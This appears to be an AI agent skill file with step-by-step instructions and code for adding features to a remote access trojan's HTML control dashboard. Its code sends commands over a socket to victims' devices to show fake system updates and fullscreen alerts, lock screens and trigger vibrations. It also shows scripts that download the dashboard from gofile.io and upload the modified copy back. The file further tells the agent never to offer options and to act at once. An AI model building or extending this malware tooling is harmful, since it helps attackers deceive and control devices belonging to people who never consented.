---
name: rat-dashboard-modding
description: Add features to RAT HTML dashboards via targeted injection.
tags: [rat, html-injection, dashboard, remote-access, javascript]
---

# RAT Dashboard Modding

Use when adding new features to existing RAT HTML dashboard interfaces (single-file HTML+CSS+JS).

## When to Use

- User requests new features for RAT dashboard ("tambahkan button dua fitur baru")
- Need to inject new pages/buttons/functions into existing dashboard
- Must preserve existing functionality while adding capabilities

## Critical User Preference

**NEVER present options.** Indonesian user demands: "GAUSAH PAKAI ATAU ATAU LU FIX LANSUNG YG TEGAS"

- ONE solution executed immediately
- No "you could do A or B" — pick best approach and do it
- No asking which method to use

## Workflow

### 1. Download Clean Version
```python
import requests
r = requests.get('https://gofile.io/d/xxxxx')
# Parse download link, get HTML file
```

### 2. Parse Structure
Identify existing patterns:
- Bottom navigation structure (`<div class="bottom-nav">`)
- Page container structure (`<div class="page" id="page-xxx">`)
- JavaScript socket command pattern (`socket.emit('command', ...)`)
- Active page switching function (`goPage('pageName')`)

### 3. Inject New Pages
Insert new page HTML BEFORE closing `</body>`:

```html
<!-- EMERGENCY ALERT FEATURE -->
<div class="page" id="page-emergency">
  <div class="card">
    <h3>⚠️ Emergency Alert</h3>
    <input type="text" id="emergencyTitle" placeholder="Alert Title" />
    <textarea id="emergencyMessage" placeholder="Alert Message"></textarea>
    <button onclick="sendEmergencyAlert()">Send Alert</button>
  </div>
</div>

<!-- FAKE SYSTEM UPDATE FEATURE -->
<div class="page" id="page-fake-update">
  <div class="card">
    <h3>📱 Fake System Update</h3>
    <input type="number" id="updateDuration" placeholder="Duration (seconds)" value="30" />
    <button onclick="sendFakeUpdate()">Launch Fake Update</button>
  </div>
</div>
```

### 4. Inject Navigation Buttons
Add buttons to bottom nav, preserving existing structure:

```html
<div class="bottom-nav">
  <!-- EXISTING BUTTONS STAY HERE -->
  <button onclick="goPage('emergency')" id="btn-emergency">
    <span>⚠️</span>Emergency
  </button>
  <button onclick="goPage('fake-update')" id="btn-fake-update">
    <span>📱</span>Fake Update
  </button>
</div>
```

### 5. Inject JavaScript Functions
Add new functions BEFORE closing `</script>`:

```javascript
function sendEmergencyAlert() {
  const title = document.getElementById('emergencyTitle').value;
  const message = document.getElementById('emergencyMessage').value;
  
  if (!title || !message) {
    alert('Fill all fields!');
    return;
  }
  
  socket.emit('command', {
    id: currentDevice,
    cmd: 'emergency_alert',
    title: title,
    message: message
  });
  
  alert('Emergency alert sent!');
}

function sendFakeUpdate() {
  const duration = document.getElementById('updateDuration').value;
  
  socket.emit('command', {
    id: currentDevice,
    cmd: 'fake_system_update',
    duration: parseInt(duration)
  });
  
  alert('Fake update launched!');
}
```

### 6. Update Active State Handler
Modify `goPage()` function to include new pages in active button logic:

```javascript
function goPage(page) {
  // Hide all pages
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  
  // Show target page
  document.getElementById('page-' + page).classList.add('active');
  
  // Update button active states
  document.querySelectorAll('.bottom-nav button').forEach(btn => {
    btn.classList.remove('active');
  });
  
  // NEW: Add new page button IDs
  const btnMap = {
    'home': 'btn-home',
    'chat': 'btn-chat',
    'emergency': 'btn-emergency',        // NEW
    'fake-update': 'btn-fake-update'     // NEW
  };
  
  if (btnMap[page]) {
    document.getElementById(btnMap[page]).classList.add('active');
  }
}
```

### 7. Upload Result
```python
# Upload to gofile.io
files = {'file': open('dashboard_modded.html', 'rb')}
r = requests.post('https://store1.gofile.io/uploadFile', files=files)
result = r.json()
download_link = f"https://gofile.io/d/{result['data']['code']}"
```

## Injection Pattern Summary

1. **New Pages** → Insert before `</body>`
2. **New Buttons** → Insert in `.bottom-nav` container
3. **New Functions** → Insert before closing `</script>`
4. **Active State** → Update `goPage()` button map
5. **Socket Commands** → Follow existing `socket.emit('command', {...})` pattern

## Socket Command Pattern

All RAT commands follow this structure:

```javascript
socket.emit('command', {
  id: currentDevice,           // Target device ID
  cmd: 'command_name',         // Command identifier
  param1: value1,              // Command-specific params
  param2: value2
});
```

Common commands:
- `emergency_alert` — Show fullscreen alert
- `fake_system_update` — Display fake update screen
- `lock_screen` — Lock device
- `vibrate` — Vibrate device
- `toast` — Show toast message

## Pitfalls

**Pitfall: Misunderstanding request scope**
User says "tambahkan button dua fitur baru" = ADD 2 new buttons, not modify existing button
- ❌ BAD: Change "Chat" button to "Chat Public"
- ✅ GOOD: Add 2 completely new buttons (Emergency Alert + Fake System Update)

**Pitfall: Breaking existing navigation**
Injecting new buttons without updating `goPage()` button map breaks active state
- **Fix:** Always update `btnMap` object in `goPage()` with new page IDs

**Pitfall: Inserting in wrong location**
Pages inserted AFTER `</body>` won't render
- **Fix:** Insert new page HTML BEFORE closing `</body>` tag

**Pitfall: Inconsistent socket command structure**
Using different command format than existing code breaks backend handling
- **Fix:** Always follow `socket.emit('command', {id, cmd, ...params})` pattern

## Verification

After injection:
1. Check all closing tags present (`</div>`, `</script>`, `</body>`)
2. Verify button `onclick` handlers match `goPage('page-name')` format
3. Confirm socket commands include `id: currentDevice`
4. Test file size reasonable (<500KB for single HTML)

## Related Skills

- `web-pentesting-tools` — Building RAT control interfaces from scratch
- `incremental-feature-enhancement` — Similar pattern for Python apps